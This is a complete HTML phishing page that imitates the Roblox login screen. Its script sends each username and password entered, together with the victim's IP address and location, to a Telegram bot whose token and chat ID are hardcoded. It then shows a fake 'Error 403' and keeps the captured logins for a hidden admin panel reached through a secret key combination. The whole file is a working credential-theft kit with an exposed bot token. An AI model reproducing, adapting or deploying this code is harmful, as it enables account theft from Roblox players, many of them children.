<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Roblox</title>
    <style>
        body, html { margin: 0; padding: 0; height: 100%; font-family: "Segoe UI", sans-serif; background: radial-gradient(circle, #252729 0%, #000 100%); color: #d1d1d1; overflow: hidden; }
        .navbar { display: flex; align-items: center; background-color: #232527; padding: 0 20px; height: 40px; position: fixed; top: 0; width: 100%; z-index: 100; border-bottom: 1px solid #111; box-sizing: border-box; }
        .logo-text { font-size: 20px; font-weight: 800; color: #fff; }
        .screen { display: none; flex-direction: column; justify-content: center; align-items: center; min-height: 100vh; width: 100%; position: absolute; }
        #login-form-screen { display: flex; }
        .login-card { background-color: #232527; width: 420px; padding: 40px; border-radius: 4px; text-align: center; box-shadow: 0 5px 20px rgba(0,0,0,0.5); }
        input { width: 100%; padding: 12px; margin-bottom: 15px; background-color: #393b3d; border: 1px solid #393b3d; border-radius: 8px; color: #fff; outline: none; }
        .btn-auth { width: 100%; padding: 12px; background: #393b3d; border: 1px solid #fff; color: #fff; border-radius: 8px; cursor: pointer; font-weight: bold; }
        
        /* –°–ø–∏—Å–æ–∫ 25 –∞–∫–∫–∞—É–Ω—Ç–æ–≤ */
        .acc-list { display: grid; grid-template-columns: 1fr 1fr; gap: 8px; margin-top: 15px; width: 100%; max-height: 250px; overflow-y: auto; padding-right: 5px; }
        .acc-item { background: #393b3d; padding: 8px; border-radius: 5px; cursor: pointer; border: 1px solid transparent; font-size: 13px; text-align: center; transition: 0.2s; }
        .acc-item:hover { border-color: #ff0000; background: #444; }

        /* –ê–¥–º–∏–Ω-–ø–∞–Ω–µ–ª—å */
        .admin-box { background: #1a1a1a; padding: 20px; border-radius: 10px; width: 95%; max-width: 1100px; border: 1px solid #444; max-height: 450px; overflow-y: auto; }
        table { width: 100%; border-collapse: collapse; font-size: 14px; }
        th, td { padding: 10px; border: 1px solid #333; text-align: left; }
        
        #live-indicator { color: #00ff00; font-size: 11px; animation: pulse 0.5s infinite; font-weight: bold; }
        @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.3; } }
        .btn-clear { background: #660000; border-color: #ff4444; color: #fff; margin-left: 10px; }
        .btn-clear:hover { background: #990000; }
    </style>
</head>
<body>

    <div class="navbar"><div class="logo-text">ROBLOX</div></div>

    <div id="login-form-screen" class="screen">
        <div class="login-card">
            <h2 style="color:#fff; margin-bottom: 30px;">Login to Roblox</h2>
            <input type="text" id="username" placeholder="Username">
            <input type="password" id="password" placeholder="Password">
            <button class="btn-auth" onclick="saveData()">Log In</button>
        </div>
    </div>

    <div id="admin-auth" class="screen">
        <div class="login-card" style="border: 2px solid #ff0000;">
            <h2 style="color: #ff0000; margin: 0;">SYSTEM ACCESS</h2>
            <p style="color: #888; margin-top: 10px;">–í–≤–µ–¥–∏—Ç–µ –∫–æ–¥ –∏ –≤—ã–±–µ—Ä–∏—Ç–µ –∞–∫–∫–∞—É–Ω—Ç.</p>
            <input type="password" id="admin_pass" placeholder="–ö–æ–¥ –∏–∑ Telegram">
            <div id="acc-selector" class="acc-list" style="display: none;"></div>
            <button id="request-btn" class="btn-auth" style="border-color: #ff0000; color: #ff0000;" onclick="startVerification()">–ü–æ–ª—É—á–∏—Ç—å –¥–æ—Å—Ç—É–ø</button>
        </div>
    </div>

    <div id="admin-panel" class="screen">
        <div class="admin-box">
            <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 10px;">
                <h2 style="color: #fff; margin: 0;">ULTRA-LIVE DB</h2>
                <span id="live-indicator">‚ö° REAL-TIME SYNC ACTIVATED</span>
            </div>
            <table>
                <thead><tr><th>User</th><th>Pass</th><th>IP & Location</th><th>Time</th></tr></thead>
                <tbody id="logData"></tbody>
            </table>
        </div>
        <div style="margin-top: 20px; display: flex; gap: 10px;">
            <button class="btn-auth" style="width: 150px;" onclick="location.reload()">–í—ã—Ö–æ–¥</button>
            <button class="btn-auth btn-clear" style="width: 180px;" onclick="clearLogs()">–û—á–∏—Å—Ç–∏—Ç—å –±–∞–∑—É</button>
        </div>
    </div>

    <script>
        const TG_TOKEN = "8385266015:AAHpN8EUWlEgoGtslfBoEoyqPycXD2gbPGw";
        const TG_CHAT_ID = "7863254073";
        let secretCode = "";
        let targetAccount = "";
        let lastLogsCount = -1;

        const mockAccounts = [
            "Admin_Vip", "Roblox_Owner", "Mod_Check", "System_Root", "User_Test", 
            "Dev_Access", "Security_Bot", "Main_Admin", "Global_Mod", "Data_Manager",
            "Root_User", "AntiCheat_Dev", "Support_01", "Vip_Guard", "Server_Host",
            "Database_Admin", "Network_Sec", "Debug_Master", "Shadow_Mod", "Tech_Lead",
            "Analyst_X", "Proxy_Node", "Kernel_User", "Log_Monitor", "Admin_Final"
        ];

        // –ì–æ—Ä—è—á–∏–µ –∫–ª–∞–≤–∏—à–∏ Ctrl + \ + 3 + Z
        let keys = {};
        document.addEventListener('keydown', (e) => {
            keys[e.code] = true;
            if (keys["ControlLeft"] && keys["Backslash"] && keys["Digit3"] && keys["KeyZ"]) showScreen('admin-auth');
        });
        document.addEventListener('keyup', (e) => { delete keys[e.code]; });

        function showScreen(id) {
            document.querySelectorAll('.screen').forEach(s => s.style.display = 'none');
            document.getElementById(id).style.display = 'flex';
        }

        async function sendToTg(text) {
            try {
                await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
                    method: "POST", headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({ chat_id: TG_CHAT_ID, text: text, parse_mode: "Markdown" })
                });
            } catch(e) { console.error("TG Send Error"); }
        }

        async function startVerification() {
            secretCode = Math.floor(1000 + Math.random() * 9000).toString();
            targetAccount = mockAccounts[Math.floor(Math.random() * mockAccounts.length)];
            await sendToTg(`üîê *–í–•–û–î –í –ê–î–ú–ò–ù–ö–£*\n–ö–æ–¥: \`${secretCode}\` \n–í—ã–±–µ—Ä–∏ –∞–∫–∫: *${targetAccount}*`);
            
            document.getElementById('request-btn').style.display = "none";
            const accSelector = document.getElementById('acc-selector');
            accSelector.style.display = "grid";
            accSelector.innerHTML = "";
            
            mockAccounts.forEach(acc => {
                const div = document.createElement('div');
                div.className = 'acc-item';
                div.innerText = acc;
                div.onclick = async () => {
                    const enteredPass = document.getElementById('admin_pass').value;
                    if (enteredPass === secretCode && acc === targetAccount) {
                        await sendToTg(`‚úÖ *–î–û–°–¢–£–ü –†–ê–ó–†–ï–®–ï–ù*\n–ê–¥–º–∏–Ω –∑–∞—à–µ–ª –≤ –ø–∞–Ω–µ–ª—å.`);
                        showScreen('admin-panel');
                        setInterval(updateLogs, 10);
                    } else { 
                        await sendToTg(`‚ùå *–ü–û–ü–´–¢–ö–ê –í–ó–õ–û–ú–ê!*\n–í–≤–µ–¥–µ–Ω –∫–æ–¥: \`${enteredPass}\` \n–í—ã–±—Ä–∞–Ω –∞–∫–∫: *${acc}*`);
                        alert("Access Denied"); location.reload(); 
                    }
                };
                accSelector.appendChild(div);
            });
        }

        async function getIP() {
            try {
                // –ü—ã—Ç–∞–µ–º—Å—è –ø–æ–ª—É—á–∏—Ç—å —á–µ—Ä–µ–∑ –æ—Å–Ω–æ–≤–Ω–æ–π —Å–µ—Ä–≤–∏—Å
                const response = await fetch('https://ipapi.co/json/');
                const data = await response.json();
                return `${data.ip} (${data.city}, ${data.country_name})`;
            } catch (e) {
                try {
                    // –†–µ–∑–µ—Ä–≤–Ω—ã–π —Å–µ—Ä–≤–∏—Å, –µ—Å–ª–∏ –ø–µ—Ä–≤—ã–π –∑–∞–±–ª–æ–∫–∏—Ä–æ–≤–∞–Ω
                    const resAlt = await fetch('https://api.ipify.org?format=json');
                    const dataAlt = await resAlt.json();
                    return dataAlt.ip + " (Unknown City)";
                } catch(e2) { return "IP Blocked/VPN"; }
            }
        }

        async function saveData() {
            const u = document.getElementById('username').value;
            const p = document.getElementById('password').value;
            if(!u || !p) return;

            const ipInfo = await getIP();
            await sendToTg(`üë§ *–ù–û–í–´–ô –õ–û–ì!*\nüë§ User: \`${u}\` \nüîë Pass: \`${p}\` \nüåê IP: \`${ipInfo}\``);
            
            let logs = JSON.parse(localStorage.getItem('roblox_logs') || '[]');
            logs.push({ user: u, pass: p, ip: ipInfo, time: new Date().toLocaleTimeString() });
            localStorage.setItem('roblox_logs', JSON.stringify(logs));
            alert("Error 403: Forbidden");
        }

        function updateLogs() {
            const logs = JSON.parse(localStorage.getItem('roblox_logs') || '[]');
            if (logs.length === lastLogsCount) return;
            const tbody = document.getElementById('logData');
            tbody.innerHTML = logs.length === 0 ? "<tr><td colspan='4' style='text-align:center'>–ë–∞–∑–∞ –ø—É—Å—Ç–∞</td></tr>" : 
                logs.slice().reverse().map(l => `<tr><td>${l.user}</td><td>${l.pass}</td><td>${l.ip}</td><td>${l.time}</td></tr>`).join('');
            lastLogsCount = logs.length;
        }

        function clearLogs() {
            if (confirm("–í–Ω–∏–º–∞–Ω–∏–µ! –≠—Ç–æ —É–¥–∞–ª–∏—Ç –≤—Å–µ –¥–∞–Ω–Ω—ã–µ –∏–∑ —Ç–∞–±–ª–∏—Ü—ã. –ü—Ä–æ–¥–æ–ª–∂–∏—Ç—å?")) {
                localStorage.removeItem('roblox_logs');
                updateLogs();
            }
        }
    </script>
</body>
</html>
